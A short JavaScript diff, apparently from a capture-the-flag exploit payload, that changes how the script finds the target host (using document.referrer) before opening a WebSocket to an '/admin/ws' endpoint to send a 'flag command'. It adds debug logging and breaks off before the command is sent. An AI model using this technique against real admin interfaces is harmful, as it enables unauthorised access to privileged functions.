@@ -8,8 +8,11 @@
         // Wait a bit to ensure the page is fully loaded
         setTimeout(() => {
             // Create WebSocket connection
-            const ws = new WebSocket(`ws://${window.top.location.host}/admin/ws`);
-            
+console.log(document.referrer);
+const referrerUrl = new URL(document.referrer);
+console.log(referrerUrl );
+const ws = new WebSocket(`ws://${referrerUrl.host}/admin/ws`);
+            console.log("2");
             ws.onopen = function() {
                 console.log("WebSocket connection opened");
                 // Send the flag command
